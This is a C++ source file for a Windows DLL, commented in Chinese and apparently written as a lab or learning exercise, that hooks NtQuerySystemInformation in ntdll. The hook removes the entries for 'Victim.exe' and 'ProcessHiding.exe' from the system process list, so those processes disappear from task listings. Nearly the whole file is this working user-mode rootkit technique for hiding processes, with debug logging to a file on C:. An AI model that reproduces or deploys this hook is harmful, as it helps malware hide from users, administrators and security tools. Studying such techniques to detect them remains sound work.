// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include "hookFunc.h"
#include "SysInfo.h"


#include <stdio.h>
#include <iostream>
#include<stdlib.h>

#include <tlhelp32.h>
#include <iostream>
#include <set>
#include <array>

#include <io.h>
#include <conio.h>
#include <fstream>

using namespace std;

//写日志
ofstream infile;


char* filename = "C:\\dllmain.txt";

//函数声明

int (WINAPI *pRealAPIentry)();


__kernel_entry NTSTATUS NTAPI hookNtQuerySystemInformation(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL);

DWORD GetProcessId(WCHAR *wProcessName);


//DLL文件程序入口
BOOL APIENTRY DllMain(
	HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
		//进程映射
	case DLL_PROCESS_ATTACH:
		//程序运行过程同时写日志
		infile.open(filename);

		//用hookNtQuerySystemInformation()替换NtQuerySystemInformation()
		if (InstallHook("ntdll.dll", "NtQuerySystemInformation",
			(void*)hookNtQuerySystemInformation,
			(void**)(&pRealAPIentry))
			)
		{
			//执行成功
			infile << "\n\nNtQuerySystemInformation Hook installed!\n\n" << endl;
		}
		else
		{
			//执行不成功
			infile << "\n\nFailed to install hook NtQuerySystemInformation!\n\n" << endl;

		}

		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		break;

	case DLL_PROCESS_DETACH://进程卸载时关闭日志
		infile.close();

		break;
	}
	return TRUE;
}


__kernel_entry NTSTATUS NTAPI hookNtQuerySystemInformation(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL)
{

	//获取NtQuerySystemInformation所在的dll文件句柄
	HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
	infile << "ntdll句柄：" << hNtDll << endl;

	if (!hNtDll)
		return NULL;

	//获取NtQuerySystemInformation的函数地址，在下一步时调用
	NTQUERYSYSTEMINFORMATION NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtDll, "NtQuerySystemInformation");

	infile << "\n取地址NtQuerySystemInformation：" << NtQuerySystemInformation << endl;

	//实现系统调用NtQuerySystemInformation，并记录返回值
	NTSTATUS org = NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	infile << "\n org:" << org << endl;

	//设置指针对函数返回的信息进行处理
	PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
	PSYSTEM_PROCESS_INFORMATION pInfobefore = pInfo;

	infile << "\n参数 \n\tSystemInformationClass\t " << SystemInformationClass << "\n\tSystemInformation\t" << SystemInformation << endl;


	if (SystemInformationClass == SystemProcessInformation)
	{//若当前处理的系统信息类型是系统进程信息类（5）

		WCHAR wProcessName[100] = L"Victim.exe";
		WCHAR wProcessName1[100] = L"ProcessHiding.exe";
		//此处标记被隐藏的进程名，如：
		//L"ProcessHiding.exe";
		//L"calc.exe";
		//L"notepad.exe";
		//调用函数获得进程ID
		DWORD dwPID = GetProcessId(wProcessName);
		DWORD dwPID1 = GetProcessId(wProcessName1);
		while (pInfo)
		{
			if ((pInfo->ProcessId == dwPID && dwPID != 0) || (pInfo->ProcessId == dwPID1 && dwPID1 != 0))
			{//找到需要被隐藏的链表信息
				infile << "\npInfo:\n\tNextEntryDelta\t" << pInfo->NextEntryDelta << "\n\tProcessId\t" << pInfo->ProcessId << "\n\tProcessName\t" << pInfo->ProcessName.Buffer << endl;

				infile << "\n\n***********\nFind " << pInfo->ProcessId << " !!!!\n*********\n\n" << endl;

				//修改链表：将当前结点跳过
				//实现原理：当前结点的地址 + 结点偏移量 = 下一个结点的地址
				//故若要跳过当前结点需要将上一个结点的偏移量改变，使其指向下一个结点
				//则上一个结点的偏移量=上一个结点的偏移量+当前结点的偏移量
				pInfobefore->NextEntryDelta += pInfo->NextEntryDelta;



				//找到下一个结点信息
				pInfo = (PSYSTEM_PROCESS_INFORMATION)(((PUCHAR)pInfo) + pInfo->NextEntryDelta);

			}
			else
			{
				infile << "\npInfo:\n\tNextEntryDelta\t" << pInfo->NextEntryDelta << "\n\tProcessId\t" << pInfo->ProcessId << "\n\tProcessName\t" << pInfo->ProcessName.Buffer << endl;
				pInfobefore = pInfo;

				if (pInfo->NextEntryDelta == 0)
				{//判断当前结点是否是末尾结点，若是，则将标记指针置空
					infile << "\n%%%%%%%%pInfo:Last!!!" << endl;
					pInfo = NULL;
				}
				else
				{//否则，找到下一个结点信息
					pInfo = (PSYSTEM_PROCESS_INFORMATION)(((PUCHAR)pInfo) + pInfo->NextEntryDelta);
				}
			}
			

		}
	}

	infile << "\n\n ok return." << endl;

	return org;

}


DWORD GetProcessId(WCHAR *wProcessName)
{//从进程名获取进程ID

	//Get first process in list
	HANDLE hProcessSnap = NULL;

	PROCESSENTRY32 peProcess = { 0 };//NULL不符合格式

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{//INVALID_HANDLE_VALUE为HANDLE的无效值
		infile << "Unable to get process list " << GetLastError() << endl;
		return 0;
	}

	peProcess.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hProcessSnap, &peProcess))
	{
		do
		{
			if (wcscmp(peProcess.szExeFile, wProcessName) == 0)
			{
				infile << "\n=========Read PID." << peProcess.th32ProcessID << endl;
				return peProcess.th32ProcessID;
			}
		} while (Process32Next(hProcessSnap, &peProcess));
	}

	infile << L"\n Process '%s' not found!\n" << wProcessName << endl;
	return 0;

}